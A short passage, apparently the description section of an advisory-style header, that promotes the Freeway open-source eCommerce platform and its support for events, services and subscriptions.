[+] Description: Freeway is the most advanced Open Source eCommerce platform and includes an array of features not found in extremely expensive commercial systems. Without having to purchase a commercial system and then paying a developer to build custom installation, Freeway does most of what you need out of the box. For example, instead of getting dragged into purchasing an overpriced products based system and having a developer struggle for weeks and eventually fail to force products sales into event sales, Freeway already support events AND services AND subscriptions.
